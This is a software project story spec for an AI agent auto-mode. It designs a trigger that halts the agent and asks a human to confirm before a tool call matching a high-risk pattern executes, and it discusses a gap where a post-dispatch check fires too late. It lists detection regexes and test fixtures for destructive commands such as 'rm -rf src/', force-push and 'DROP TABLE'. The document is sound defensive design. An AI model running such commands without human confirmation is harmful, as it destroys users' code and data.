# Story 4.7: STOP Trigger 6 — High-Risk Path Detected

**Status:** done

**Epic:** 4 — Auto-Mode & Autonomous Execution (`/sdlc-auto`)
**Layer:** 2 (`docs/sprints/epic-4-dag.md` §3 — one of the 8-story STOP-trigger fan-out; **SECURITY-SENSITIVE** — DAG §4 names 4.7 a top-2 highest-risk Epic-4 story alongside 4.1)
**Worktree:** `epic-4/4-7-stop-high-risk` (owner: Winston, DAG §5:195)
**Critical Path:** **OFF** the critical path (the critical path is `4.1 → 4.2 → 4.10 → 4.11 → 4.12`, DAG §4). But 4.7 is a hard **convergence prerequisite for 4.11**: `4.11` (mad-mode) "must halt on the other 5 STOPs" — 4.7 is one of those 5 (DAG §5:199). 4.11 cannot branch until every STOP trigger (4.2–4.8) has merged (DAG §6:176).
**Depends on (all on `main`):** **4.1** — the frozen `engine/stop_triggers.py` STOP-check interface + `engine/auto_loop.py` loop + `State.auto_loop_status`/`stop_reason` (done, `2cc8ce4`); **4.2** — the **real registry seam** (`engine/stop_registry.py` `_ORDERED_TRIGGERS`), the `stop_triggered` journal kind + projection fold, the autouse `_reset_stop_trigger_registry` conftest fixture (done, close-out `e539d5f`); **2B.6** — the dispatcher destructive-op classifier + pre-execution re-confirmation gate (`src/sdlc/dispatcher/safety.py`, `_run_member` AC3 block); **2B.7** — `docs/threat-model.md` (the documented high-risk pattern set this story binds to). Epic 1 substrate — `append_with_seq_alloc` (ADR-032), `project_from_journal` (1.12), `MockAIRuntime` (1.13).
**Consumed by (downstream):** **4.11** — mad-mode must HALT on this STOP (one of the "other 5"); **5.19** — dashboard renders this STOP as a banner.

> **Layer-2 precondition — VERIFIED.** 4.7 is **not** Story N.1, so the CONTRIBUTING §7.4 epic-entry gate does **not** re-apply (epic-4 is `in-progress`; the gate cleared at 4.1). The Layer-2 precondition is **"4.1's loop + 4.2's registry seam frozen on `main`"** — satisfied: 4.1 is `done` (`2cc8ce4`) and **4.2 is `done`** (close-out `e539d5f` — *"registry seam frozen on main"*); `engine/stop_triggers.py`, `engine/stop_registry.py`, `engine/auto_loop.py`, `state/projection.py` are on `main`; `freeze_wireformat_snapshots --check` is **7/7** (`tests/contract_snapshots/v1/` holds exactly 7 JSON snapshots — grep-confirmed). **Inherited carry (cite, do not fix here):** **CR4.2-W3** — `halted` is non-sticky across runs (`auto_loop_iteration(action="stopped")` clobbers an earlier `stop_triggered`→`halted` because the fold is last-write-wins); deferred to the 4.10/4.11 lifecycle owners. 4.7 inherits 4.2's non-sticky halt representation **unchanged** — do not re-open it.

---

## Story

As a **user enforcing the high-risk-path safeguard**,
I want **the loop to halt before a specialist's tool call that matches a documented high-risk pattern (file delete in the source tree, force-push, drop database, secret-exfil) reaches the filesystem, with explicit human confirmation required to proceed**,
so that **destructive operations always have a human-in-the-loop confirmation and never run unconfirmed in auto-mode** (PRD **FR21** trigger 6; the loop's resume contract **NFR-REL-5** is inherited from 4.1 and must be preserved).

---

## Acceptance Criteria

> **READ FIRST — binding ground-truth corrections + scope boundaries (verified against the codebase 2026-06-18). 4.7 is the ONE Layer-2 STOP that breaks the pure-additive vanilla pattern — it has a real architectural seam to resolve (DH1) AND it is the only sibling that touches ADR-028 (+1 kind). Do not treat it like 4.3–4.6. Do not skip.**
>
> **(C1) SCOPE — 4.7 DETECTS a high-risk tool call + HALTS the loop *before the destructive op runs* + RECORDS; it never executes the op unconfirmed, and it does not author the threat-model patterns (2B.7 already shipped them).** 4.7 plugs into 4.2's frozen registry as the 6th trigger (`trigger_id = "high_risk_path"`). The patterns it matches are documented in `docs/threat-model.md` (SDLC-THREAT-002) and already mechanised by the 2B.6 classifier — see C6/DH1. 4.7 does **not** define new patterns from scratch; it binds to the existing documented set + the AC-mandated adversarial fixtures (force-push, `rm -rf src/`, `DROP TABLE`, secret-exfil).
>
> **(C2 — THE HEADLINE CORRECTION) THE FROZEN STOP-CHECK RUNS *POST*-DISPATCH; A NAIVE `StopTrigger.check()` WOULD FIRE *AFTER* THE DESTRUCTIVE OP ALREADY RAN.** This is a false-negative safety hole, not a style nit. Verified in `auto_loop.py`: `dispatch_fn(...)` runs at `:276`, and `check_stop(repo_root=..., state=state)` runs at `:286` — **AFTER** the dispatch with the **PRE-dispatch** `state` snapshot taken at `:236`. The epics AC, by contrast, is **pre-execution**: *"STOP-check inspects the **queued** tool call"* (epics.md:2186), *"the dispatcher **proceeds** with the tool call"* only on no-match (epics.md:2194), *"if the user does not confirm, **the dispatch never happens**"* (epics.md:2199). A pure-disk `StopTrigger.check(repo_root, state)` registered into 4.2's `_ORDERED_TRIGGERS` would see nothing on disk at check-time (the tool call lives in `AgentResult.tool_calls`, in memory, never written to `repo_root`) and would fire — if at all — only on the *next* iteration, after `rm -rf src/` already deleted the tree. **The dev MUST resolve where interception hooks before writing code. See DH1 — the headline Decision. This is the single most important correction in this story.**
>
> **(C3) THE PRE-EXECUTION GATE ALREADY EXISTS in the dispatcher (2B.6) — REUSE it, do not reinvent it.** Verified in `src/sdlc/dispatcher/_panel_helpers.py:584–688` (`_run_member`): after the runtime returns `AgentResult` but **before** `atomic_write` (`:721`), the AC3 block iterates `agent_result.tool_calls`, calls `is_destructive(tc)` (`safety.py:162`), and on a finding runs `prompt_for_reconfirmation(nonce, category, excerpt)` (`safety.py:180`) under `DESTRUCTIVE_PAUSE_LOCK` — **all-or-nothing, BEFORE any artifact write**. `is_destructive` already pattern-matches exactly three of this AC's four patterns: `file_delete` (`\brm\s+(-rf|-fr)\b`), `force_push` / `force_push_with_lease`, `drop_database` (`\bDROP\s+(DATABASE|TABLE|SCHEMA)\b`) — `safety.py:118–126`. This IS the pre-execution interception seam the AC describes. **What it does NOT do today: (a) it has no `secret_exfil` pattern; (b) it does NOT halt the auto-loop — on rejection it raises `DispatchError`, which `dispatch`/`dispatch_panel` convert to a `stop_trigger_raised` placeholder (`core.py:232,370,422,469`) consumed by Story 4.6, NOT a `high_risk_path` halt.** DH1 is exactly *how 4.7 bridges this 2B.6 gate to a 4.2-registry `high_risk_path` halt*.
>
> **(C4) MODULE-BOUNDARY DIRECTIONALITY pins the seam — `dispatcher` MUST NOT import `engine`, but `engine` MAY import `dispatcher`.** Verified in `scripts/module_boundary_table.py`: the `dispatcher` row is `forbidden_from={"engine","cli"}` (`:95`); the `engine` row's `depends_on` **includes `"dispatcher"`** (`:105`) and is `forbidden_from={"cli","dashboard"}` (`:114`). **Consequence (load-bearing for DH1):** a gate living inside `dispatcher/safety.py` or `_run_member` **cannot** import `engine.stop_triggers.StopTrigger` / `StopDecision` — that edge is forbidden. So the high-risk detection logic (pattern set, classifier) is a **dispatcher-native** concern the engine *consumes*; the `StopTrigger` plugged into 4.2's registry lives in `engine/stop_high_risk.py` and may import from `dispatcher`/`runtime`. Run `scripts/check_module_boundaries.py` on every new `src/` file (C8). Do NOT add `engine` to the dispatcher's `depends_on` to "make it work" — that inverts the layering and the gate will reject it.
>
> **(C5 — THE +1 ADR-028 KIND, this story's net-new) `high_risk_confirmed` IS NET-NEW + AC-MANDATED on the CONFIRM-RESUME path ONLY.** The resume AC requires: on `--confirm-tool-call <id>` re-run, *"the previously-blocked tool call proceeds with an explicit journal entry `kind=high_risk_confirmed, tool=...`"* (epics.md:2198). `grep -rn high_risk_confirmed src/` → **zero hits** today; 4.7 introduces it. Add it via the **ADR-028 forward rule** (`docs/decisions/ADR-028-journal-kind-taxonomy.md` §3 taxonomy-table row, alphabetised within the `4.7` source-story grouping + §4 Revision-Log line citing Story 4.7). `JournalEntry.kind` is a bare `str` → **NO contract/snapshot change** (freeze stays 7/7). **The `high_risk_confirmed` row is ALREADY pre-named in DAG D1's affected-shapes list (`epic-4-dag.md:256`)** — this is the expected, planned kind. **CRITICAL DISTINCTION — unlike pure-vanilla siblings 4.3/4.4/4.5, 4.7 DOES touch ADR-028.** The HALT itself still uses the frozen `stop_triggered(trigger=high_risk_path, ...)` fired-branch (4.2's representation, reused verbatim — see C7); `high_risk_confirmed` is ONLY for the confirm-resume path that *un-blocks* a previously-halted op. Two distinct journal kinds, two distinct lifecycle moments. Do NOT collapse them; do NOT route the halt through `high_risk_confirmed`.
>
> **(C6) ZERO new wire-format contracts (DAG D1 ratified, `epic-4-dag.md:258`). STOPDECISION HAS ONLY 4 FIELDS — pack tool-name + matched pattern into `reason`, path into `target`.** `StopDecision` is frozen at `{fired, trigger, target, reason}` (`stop_triggers.py:16–23`, byte-stable per 4.2's C2). The AC asks for `trigger=high_risk_path, tool=<name>, target=<path>, reason=<pattern-match>` — but **there is no `tool` field and you may NOT add one** (it would break the frozen `StopDecision` + the 4.2-pinned `test_stop_triggers.py` and is forbidden by the freeze). Map it: `target` = the path/argument the op acts on (e.g. `src/`); `reason` = a string packing **both** the tool name and the matched pattern category (e.g. `"Bash:file_delete (rm -rf src/)"`). The journal `high_risk_confirmed` payload (a plain dict, C5) MAY carry a discrete `tool` key — only the frozen `StopDecision` is constrained. No `src/sdlc/contracts/` edits; `freeze_wireformat_snapshots --check` stays **7/7**.
>
> **(C7) THE HALT REUSES 4.2's `stop_triggered` FIRED-BRANCH VERBATIM — `auto_loop.py` is byte-stable for 4.7.** 4.2 already built the generic halt machinery: on a fired STOP, `_finish_halted_on_stop_trigger` (`auto_loop.py:153–178`) journals `kind=stop_triggered {trigger, target, reason?, correlation_id}`, and the projection fold maps `stop_triggered` → `("halted", payload["trigger"])` (`projection.py:69–101`). Because `trigger="high_risk_path"`, the existing fold yields `auto_loop_status="halted", stop_reason="high_risk_path"` with **ZERO projection edits** and **ZERO `auto_loop.py` edits** (`projection.py` already lists `stop_triggered` in `_KNOWN_KINDS` `:50`, the dispatch set `:147`, and the fold `:97`). The `stop_triggered` ADR-028 row already exists (4.2). **The ONLY thing 4.7 adds to the journal taxonomy is `high_risk_confirmed`** (C5) — for the confirm path, not the halt path.
>
> **(C8) LOC ≤ 400 / absolute imports / mock-runtime posture / shared-file append.** Every new `src/` file is **≤ 400 LOC** (NFR-MAINT-3 gate). Absolute `from sdlc.X import Y` only (relative imports inside `src/sdlc/<module>/` are gate-forbidden). Tests run under `SDLC_USE_MOCK_RUNTIME=1` (autouse, `tests/conftest.py`) — the mock runtime is how you inject a high-risk `tool_calls` payload into `AgentResult` deterministically (`AgentResult.tool_calls: tuple[Mapping[str, object], ...]`, `runtime/abc.py:29`). **SHARED-FILE:** 4.7 appends **one reviewed line** to `engine/stop_registry.py` `_ORDERED_TRIGGERS` (`:13`) — see DH2 for the priority-ordering Decision (safety-first vs story-order). The autouse `_reset_stop_trigger_registry` fixture (`tests/conftest.py:63–76`) already isolates the registry — reuse it, do not re-add.

---

**AC1 — Positive: a high-risk tool call halts the loop *before it executes* (FR21 trigger 6).** *(epics.md:2185–2189)*
**Given** the auto-loop running and a specialist returning a tool call matching a documented high-risk pattern (`docs/threat-model.md` SDLC-THREAT-002 + the AC fixtures),
**When** the pre-execution gate inspects the **queued** tool call (DH1 — at the seam that runs BEFORE the op reaches the filesystem, **not** the frozen post-dispatch `check_stop`; C2/C3),
**Then** the loop halts with `trigger=high_risk_path`, `target=<path>`, `reason=<tool-name + pattern-match>` (C6 — only 4 `StopDecision` fields; pack tool+pattern into `reason`),
**And** the user is shown the exact tool-call payload for review,
**And** the journal records `kind=stop_triggered, trigger=high_risk_path, target=<path>` via the **frozen 4.2 fired-branch** (C7 — `append_with_seq_alloc` + event sentinel; reused, not re-built),
**And** `state.json` reflects `auto_loop_status: halted, stop_reason: high_risk_path` via the **existing** projection fold (C7 — ZERO projection edits),
**And** the destructive op **did not run** (the core safety invariant — false-negative = `rm -rf src/` runs unconfirmed; C2).

**AC2 — Negative: no high-risk match → dispatcher proceeds.** *(epics.md:2191–2194)*
**Given** a tool call with no high-risk pattern match (and the empty-`tool_calls` case — treat as "no match", never an error),
**When** the loop iterates,
**Then** STOP-check for trigger 6 returns `fired=False` (no halt),
**And** the dispatcher proceeds with the tool call (no `stop_triggered` entry, no `high_risk_confirmed` entry, no halt).

**AC3 — Resume: explicit confirmation un-blocks the op + journals `high_risk_confirmed` (preserves NFR-REL-5).** *(epics.md:2196–2199)*
**Given** the loop halted on this trigger and the user **explicitly** confirms the high-risk operation (via `--confirm-tool-call <id>` or equivalent — see DH3 for the canonical confirmation token/seam),
**When** I re-run `/sdlc-auto`,
**Then** the previously-blocked tool call proceeds,
**And** the journal records a **net-new** `kind=high_risk_confirmed, tool=...` entry (C5 — ADR-028 forward-rule row; distinct from the `stop_triggered` halt),
**And** if the user does **not** confirm, **the dispatch never happens** (no execution, the halt persists — the resume reads the confirmation state from disk; pure-function-of-disk).

**AC4 — 4-cell matrix × adversarial fixtures (the merge gate).** *(epics.md:2201–2203)*
**Given** the 4-cell test matrix **and adversarial fixtures per pattern** (force-push, `rm -rf src/`, `DROP TABLE`, plus secret-exfil),
**When** `tests/integration/stop_triggers/test_stop_high_risk.py` runs (the directory exists — 4.2 created it; add the new module, **not** a new dir),
**Then** all 4 cells pass **FOR EACH PATTERN**: **(1) positive** (high-risk call present → halt before execution + `stop_triggered` entry), **(2) negative** (no match → dispatcher proceeds), **(3) termination state** (`state.json` reflects `halted`/`high_risk_path` via the fold), **(4) confirm-resume** (explicit confirm → op proceeds + `high_risk_confirmed` journaled; no-confirm → dispatch never happens). Each pattern carries **positive + negative** coverage.

**AC5 — Quality gate green + TDD-first (CONTRIBUTING §1/§2/§5).**
Quality gate green per §1 (ruff format/check, `mypy --strict src/`, **full** pytest suite, coverage ≥ 87 operational floor, pre-commit, `mkdocs build --strict`, `freeze_wireformat_snapshots --check` **7/7 unchanged**, module-boundary + LOC ≤ 400). **TDD-first (§2):** the adversarial-fixture behavior suite (trigger detection per pattern + 4-cell matrix + confirm-resume journaling `high_risk_confirmed`) is the failing-first commit, **RED before** the trigger/gate + the `_ORDERED_TRIGGERS` append + the ADR-028 row land, visible in `git log --reverse` (`test(4.7)` → `feat(4.7)`). **Run the FULL suite** (the 4.1/4.2 lesson — a partial run hid pre-existing failures; layer reviews only diff the change). Material decisions surfaced as **DH1/DH2/DH3** (§5).

---

## Tasks / Subtasks

> **TDD-first ordering (§2):** the failing-first commit is the adversarial-fixture behavior suite — per-pattern high-risk detection (force-push, `rm -rf src/`, `DROP TABLE`, secret-exfil) + the 4-cell loop-halt-before-execution matrix + the `--confirm-tool-call` resume journaling `high_risk_confirmed` + the no-confirm "dispatch never happens" cell. All RED before `engine/stop_high_risk.py`, the dispatcher gate wiring (DH1), the `_ORDERED_TRIGGERS` append, and the ADR-028 `high_risk_confirmed` row land.

- [x] **(§5) DH0 — Resolve DH1/DH2/DH3** (interception seam · registry priority order · confirmation token/seam) and record the choices in the Change Log **before writing code**. Recommended answers are pre-filled in §Decisions; confirm or override. **DH1 is the gating decision — do not write code until it is settled.**
- [x] **(AC1–AC4, §2) Write the failing adversarial-fixture suite FIRST.**
  - `tests/unit/engine/test_stop_high_risk.py` — instantiate the `high_risk_path` trigger; assert `isinstance(trigger, StopTrigger)` (mirror `test_stop_triggers.py` Protocol shape + 4.2's `test_stop_clarification.py`). Drive the detection logic with a high-risk `AgentResult.tool_calls` payload **per pattern** (positive: `rm -rf src/`, `git push --force`, `DROP TABLE x`, secret-exfil) → fires with `trigger="high_risk_path"`, `target`, `reason` packing tool+pattern (C6); negative: a benign `Bash` call → `fired=False`. RED.
  - `tests/integration/stop_triggers/test_stop_high_risk.py` (new module in the **existing** `stop_triggers/` dir — 4.2 created it; `pytestmark = pytest.mark.integration`, mirror `test_stop_clarification.py:1–25` runtime/registry wiring) — the **4-cell matrix × each pattern**: **(1)** high-risk queued → halt **before** `atomic_write`/execution + a `stop_triggered {trigger:"high_risk_path"}` entry (read via `iter_entries`); **(2)** benign → dispatcher proceeds, no halt; **(3)** termination → `project_from_journal(journal).auto_loop_status == "halted"`, `stop_reason == "high_risk_path"`; **(4)** confirm-resume → with `--confirm-tool-call <id>` the op proceeds + a `high_risk_confirmed` entry is journaled, and **without** confirmation the dispatch never happens (assert no execution side-effect + halt persists). RED.
  - A registry-priority assertion proving the new trigger is reachable via `check_stop`/`ordered_triggers()` at the DH2 position. RED.
- [x] **(AC1, C2, C3, C4, DH1) Land the interception seam.** Per the ratified DH1: wire the high-risk detection so it intercepts the **queued** tool call **before execution** and produces a `high_risk_path` halt routed through 4.2's `stop_triggered` fired-branch. **Respect C4 directionality** — detection/pattern logic is dispatcher-native (extend/reuse `dispatcher/safety.py`); the `StopTrigger` consumer lives in `engine/`. Add the missing `secret_exfil` pattern to the dispatcher classifier (C3 — today's `_DESTRUCTIVE_TOOL_PATTERNS` has only file_delete/force_push/drop_database). ≤ 400 LOC each file.
- [x] **(AC1, C6, C7) Implement the trigger** — `src/sdlc/engine/stop_high_risk.py`: class with `trigger_id = "high_risk_path"` + `check(self, *, repo_root: Path, state: State) -> StopDecision`. Return `StopDecision(fired=True, trigger="high_risk_path", target=<path>, reason=<tool+pattern>)` on a finding (C6 — 4-field pack). Reuse 4.2's `stop_triggered` halt verbatim (C7 — no `auto_loop.py`/`projection.py` edits). ≤ 400 LOC.
- [x] **(C8, DH2) Append to the registry** — add **one reviewed line** to `engine/stop_registry.py` `_ORDERED_TRIGGERS` (`:13`) at the DH2-chosen priority position. Keep public symbols byte-stable. Reuse the autouse `_reset_stop_trigger_registry` fixture (`tests/conftest.py:63`).
- [x] **(AC3, C5, DH3) Implement confirm-resume + journal `high_risk_confirmed`.** Per DH3: the `--confirm-tool-call <id>` (or equivalent) path lets the previously-blocked op proceed and journals a net-new `kind=high_risk_confirmed, tool=...` entry (`append_with_seq_alloc` + event sentinel `before_hash=None`, `after_hash="sha256:"+"0"*64`). No-confirm → dispatch never happens. Cover both branches in cell 4.
- [x] **(C5) Register the journal kind** — add a `high_risk_confirmed` row (source-story **4.7**) to `ADR-028 §3` taxonomy table + one §4 Revision-Log line citing Story 4.7. **NOTE the halt still uses `stop_triggered` (4.2's row, unchanged) — only `high_risk_confirmed` is new.** No `JournalEntry` change; freeze stays 7/7.
- [x] **(AC4) Adversarial fixtures** — encode force-push, `rm -rf src/`, `DROP TABLE`, secret-exfil as deterministic mock-runtime `tool_calls` payloads; each pattern gets a positive (halts) + negative (benign sibling proceeds) cell. Cross-reference `docs/threat-model.md` SDLC-THREAT-002 for the documented pattern set; note any pattern 4.7 adds beyond 2B.6's catalogue (secret-exfil is net-new — see CR2B6-W1 catalogue-expansion debt in `safety.py:166`).
- [x] **(AC5, §1) Full quality gate to green** — ruff, `mypy --strict src/`, **full** pytest (not just new files), coverage ≥ 87, pre-commit, `mkdocs build --strict`, freeze **7/7**, module-boundary + LOC ≤ 400. Run `scripts/check_module_boundaries.py` explicitly on `src/sdlc/engine/stop_high_risk.py` **and** any modified `src/sdlc/dispatcher/*.py` (C4 — prove the `dispatcher ↛ engine` edge stays clean).
- [x] **(§3) Worktree** — branch `epic-4/4-7-stop-high-risk` off up-to-date `main`; rebase before merge. Merge before 4.11 branches (4.11 waits on all of 4.2–4.8; DAG §6).
- [ ] **(§4) Chunked review** — review-A/B/C via the `code-review` workflow once status is `review` (different LLM context). **Route review-B through `security-reviewer`** (DAG §7:239 mandate; SECURITY-SENSITIVE) — the false-negative `rm -rf src/` runs-unconfirmed invariant + DH1's interception seam are the review-B focus. **Run the full suite during review** (§4.4 / the 4.1/4.2 lesson).

---

## Dev Notes

### Substrate map (verified 2026-06-18 — exact symbols; wrong names break the build)

| Concern | Symbol / path | Notes |
|---|---|---|
| **frozen STOP result** | `engine.stop_triggers.StopDecision` (`stop_triggers.py:16–23`) | `@dataclass(frozen=True)`; ONLY `fired/trigger/target/reason`. **Byte-stable** (4.2 C2). No `tool` field — pack tool+pattern into `reason` (C6). |
| **frozen STOP Protocol** | `engine.stop_triggers.StopTrigger` (`:26–32`) | `@runtime_checkable`; `trigger_id: str` + `check(self, *, repo_root: Path, state: State) -> StopDecision`. 4.7's class must satisfy `isinstance(...)`. |
| **registry seam (4.2, FROZEN)** | `engine.stop_registry._ORDERED_TRIGGERS` (`:13`), `ordered_triggers()` (`:18`), `register()`+`isinstance` guard (`:23–30`), `check_all` first-fired (`:33–39`) | **APPEND one line** to the tuple (C8 / DH2). `register()` already rejects non-conforming triggers (4.2 review patch). |
| **frozen halt machinery (4.2, REUSE verbatim)** | `engine.auto_loop._finish_halted_on_stop_trigger` (`:153–178`) → `_append_stop_triggered` (`:133–150`) | Journals `kind=stop_triggered {trigger, target, reason?, correlation_id}` on the fired-branch. `check_stop` runs POST-dispatch (`:286`) with the PRE-dispatch `state` (`:236`) — **the C2 tension**. **No `auto_loop.py` edits for 4.7.** |
| **projection fold (4.2, REUSE verbatim)** | `state.projection._fold_auto_loop_status` (`:84–101`); `stop_triggered` already in `_KNOWN_KINDS` (`:50`), dispatch set (`:147`), fold (`:97`) | `stop_triggered`→`("halted", payload["trigger"])`. `trigger="high_risk_path"` folds correctly with **ZERO edits**. |
| **THE PRE-EXECUTION GATE (2B.6 — the real seam)** | `dispatcher._panel_helpers._run_member` AC3 block (`:584–688`); runs AFTER `runtime.dispatch` returns, BEFORE `atomic_write` (`:721`) | Iterates `agent_result.tool_calls`; `is_destructive` → `prompt_for_reconfirmation` under `DESTRUCTIVE_PAUSE_LOCK`; all-or-nothing; on reject raises `DispatchError`. **This is where 4.7's interception belongs (DH1).** |
| **destructive classifier (2B.6)** | `dispatcher.safety.is_destructive` (`:162`), `_DESTRUCTIVE_TOOL_PATTERNS` (`:118–126`), `tool_call_excerpt` (`:143`), `prompt_for_reconfirmation` (`:180`) | Matches `file_delete`/`force_push`/`force_push_with_lease`/`drop_database`. **No `secret_exfil` pattern — 4.7 adds it** (CR2B6-W1 catalogue debt, `:166`). v1 scope: `name=="Bash"` only. |
| **runtime tool-call shape** | `runtime.abc.AgentResult.tool_calls: tuple[Mapping[str, object], ...]` (`abc.py:29`); `AIRuntime.dispatch(prompt, context) -> AgentResult` (`:44`) | `frozen=True, extra="forbid"` — **cannot add fields**. A tool_call is a `Mapping` with `name`/`command` keys (cf. `safety.py:167–170`). MockAIRuntime injects fixtures deterministically. |
| **module boundary (pins DH1)** | `scripts/module_boundary_table.py`: `dispatcher` `forbidden_from={"engine","cli"}` (`:95`); `engine` `depends_on` includes `"dispatcher"` (`:105`), `forbidden_from={"cli","dashboard"}` (`:114`) | **`dispatcher ↛ engine`, but `engine → dispatcher` OK** (C4). Detection logic is dispatcher-native; the `StopTrigger` consumer is in `engine/`. |
| **threat-model patterns (2B.7)** | `docs/threat-model.md` SDLC-THREAT-002 (`:116–199`) | Documented set: file-delete (`rm -rf`, `git clean -fd`), force-push, drop-database. Mitigation = `safety.py` re-confirmation. 4.7's `target`/`reason` cross-reference this. |
| **journal kind to ADD** | `high_risk_confirmed` (ADR-028 §3 + §4) | Net-new, source-story 4.7, confirm-resume path ONLY (C5). Pre-named in DAG D1 (`epic-4-dag.md:256`). Bare-str kind → no contract change. |
| **registry isolation fixture (4.2)** | `tests/conftest.py:_reset_stop_trigger_registry` (`:63–76`, autouse) | Snapshots/restores `stop_registry._extra_triggers`. **Reuse — do not re-add.** |
| **NOT 4.7's** | `dispatcher._panel_helpers._emit_stop_trigger` → `kind=stop_trigger_raised` (`:228–254`); `core.py:232,370,422,469` | The 2A.3 agent-failure seam — **Story 4.6** consumes it. `DispatchError`→`stop_trigger_raised` is a DIFFERENT halt than 4.7's `stop_triggered{high_risk_path}`. Do not conflate. |

### The architectural tension — resolved (read before implementing DH1)

The AC describes **pre-execution interception** ("inspects the *queued* tool call", "dispatch *never happens*" without confirmation). The frozen 4.2 STOP-check (`check_stop`) runs **post-dispatch** (`auto_loop.py:286`, after `dispatch_fn` at `:276`) on a **pure-disk** `repo_root`/`state` — it can only see what's been written to disk, and a queued tool call is in-memory (`AgentResult.tool_calls`), never on disk. **A `high_risk_path` trigger that only implements `StopTrigger.check(repo_root, state)` and registers into `_ORDERED_TRIGGERS` would fire too late — after `rm -rf src/` already ran.** That is the false-negative safety hole the SECURITY-SENSITIVE designation is about (DAG §7:239).

**The good news (verified):** the real pre-execution gate already exists and already covers 3 of the 4 patterns. `_run_member` (`_panel_helpers.py:584–688`) inspects `agent_result.tool_calls` **after the runtime returns but before `atomic_write`**, and pauses for human re-confirmation under a lock. 4.7's job is to **bridge that 2B.6 gate to a 4.2-registry `high_risk_path` halt** — not to bolt detection onto the post-dispatch `check_stop`. The module boundary (C4) forces the split: detection is dispatcher-native; the engine-side `StopTrigger` is the registry citizen the loop and dashboard see.

### `StopDecision` field-packing (C6 worked example)

AC asks `trigger=high_risk_path, tool=<name>, target=<path>, reason=<pattern-match>` but `StopDecision` has only `{fired, trigger, target, reason}`. Map it:
- `trigger = "high_risk_path"`
- `target = "src/"` (or the path/argument the op acts on)
- `reason = "Bash:file_delete (rm -rf src/)"` — packs tool name + matched category + excerpt.

The journal `high_risk_confirmed` payload is a plain dict and MAY carry a discrete `tool` key (`{"tool": "Bash", "category": "file_delete", ...}`) — only the frozen `StopDecision` is field-constrained.

### Test idioms (reuse from 4.1/4.2 — do not invent)

- **Mock-runtime autouse:** `tests/conftest.py` sets `SDLC_USE_MOCK_RUNTIME=1` suite-wide. Inject the high-risk tool call by constructing an `AgentResult(tool_calls=(...,))` fixture the mock returns — this is how the pre-execution gate sees a destructive call deterministically without a real runtime.
- **Registry isolation:** the autouse `_reset_stop_trigger_registry` fixture (`tests/conftest.py:63`) already snapshots/restores `_extra_triggers` — your registry-priority test inherits it.
- **Integration layout:** `tests/integration/stop_triggers/` **exists** (4.2). Add `test_stop_high_risk.py` as a new module (`pytestmark = pytest.mark.integration`); mirror `test_stop_clarification.py:1–25` for runtime/registry wiring. Do NOT create a new directory or `__init__.py`.
- **Unit Protocol shape:** mirror `tests/unit/engine/test_stop_triggers.py` `isinstance(stub, StopTrigger)` + 4.2's `tests/unit/engine/test_stop_clarification.py` instantiation pattern.
- **Resume cell:** pure-fn-of-disk — write the confirmation state to disk, re-run, assert the op proceeds + `high_risk_confirmed` journaled; the no-confirm branch asserts no execution side-effect.

### Project Structure Notes

- **New files:** `src/sdlc/engine/stop_high_risk.py` (the trigger + engine-side consumer); `tests/unit/engine/test_stop_high_risk.py`; `tests/integration/stop_triggers/test_stop_high_risk.py`. **Possibly** a dispatcher-side gate edit per DH1 (extend `dispatcher/safety.py` for the `secret_exfil` pattern + the bridge — DH1 decides the exact file).
- **Modified:** `src/sdlc/engine/stop_registry.py` (+1 `_ORDERED_TRIGGERS` line — public symbols byte-stable); `docs/decisions/ADR-028-journal-kind-taxonomy.md` (+1 kind: `high_risk_confirmed`); the dispatcher gate file(s) per DH1; possibly `src/sdlc/engine/__init__.py` (export). **NOT modified:** `auto_loop.py`, `projection.py`, `stop_triggers.py` (4.2's halt + fold + Protocol are reused verbatim — C7).
- **Conventions:** every `src/` file ≤ 400 LOC; absolute `from sdlc.X import Y` imports only; `dispatcher` never imports `engine` (C4) — run `scripts/check_module_boundaries.py` on both touched modules.

### References

- Epic + ACs: `_bmad-output/planning-artifacts/epics.md:2177–2203` (Story 4.7 + the 4 BDD ACs); FR21 trigger 6 (`:2181`); secret-exfil pattern named (`:2180`).
- Threat model: `docs/threat-model.md` SDLC-THREAT-002 (`:116–199`) — documented high-risk pattern set + the 2B.6 mitigation (`safety.py` re-confirmation).
- The pre-execution gate (2B.6): `src/sdlc/dispatcher/safety.py` (classifier + `prompt_for_reconfirmation`); `src/sdlc/dispatcher/_panel_helpers.py:584–688` (`_run_member` AC3 block — runs before `atomic_write:721`); `destructive_op_*` kinds in ADR-028 §3.
- Frozen 4.2 seam: `src/sdlc/engine/stop_registry.py` (`_ORDERED_TRIGGERS:13`); `src/sdlc/engine/auto_loop.py:153–178,286` (fired-branch + post-dispatch check); `src/sdlc/state/projection.py:84–101` (fold); 4.2 story `_bmad-output/implementation-artifacts/4-2-stop-trigger-1-open-clarification.md` (registry seam + CR4.2-W3 inherited carry).
- Module boundary: `scripts/module_boundary_table.py:77–115` (`dispatcher`/`engine` rows — the C4 directionality).
- Runtime: `src/sdlc/runtime/abc.py:15–54` (`AgentResult.tool_calls`, `AIRuntime.dispatch`).
- Journal taxonomy + forward rule: `docs/decisions/ADR-028-journal-kind-taxonomy.md` §3/§4; `high_risk_confirmed` pre-named in DAG D1 (`docs/sprints/epic-4-dag.md:256`); seq-alloc ADR-032.
- DAG / decisions: `docs/sprints/epic-4-dag.md` §4 (4.7 top-2 risk `:180–181`), §5 (worktree/owner `:195`), §6 (4.11 convergence barrier `:176`), §7 (SECURITY-SENSITIVE mitigation + `security-reviewer` at review-B `:239`), D1 (zero new contracts `:248–264`).
- Requirements: `_bmad-output/planning-artifacts/prd.md` FR21 (trigger 6); NFR-REL-5 (resume contract, inherited from 4.1).

---

## Decisions Needed

- **DH1 — Interception seam (THE HEADLINE: where does high-risk detection hook so the destructive op never runs unconfirmed?).** The frozen post-dispatch `check_stop` (`auto_loop.py:286`) fires AFTER `dispatch_fn` and sees only disk — too late for an in-memory queued tool call (C2). The AC demands pre-execution interception. Hard constraint: false-negative = `rm -rf src/` runs unconfirmed (SECURITY-SENSITIVE).
  - **(a) Bridge the existing 2B.6 pre-execution gate to a `high_risk_path` halt.** The `_run_member` AC3 block (`_panel_helpers.py:584–688`) already inspects `agent_result.tool_calls` and pauses **before** `atomic_write`. Extend the dispatcher classifier (`safety.py`) with the missing `secret_exfil` pattern, and route an unconfirmed high-risk finding into the auto-loop's `stop_triggered{trigger="high_risk_path"}` halt (the engine-side `StopTrigger` in `stop_high_risk.py` is the registry/dashboard citizen; the dispatcher detects, the engine halts — respecting C4's `dispatcher ↛ engine`). **This genuinely prevents the op from running unconfirmed** (the gate is the only path tool_calls take to disk) and reuses the battle-tested 2B.6 lock/all-or-nothing machinery. **(Recommended.)**
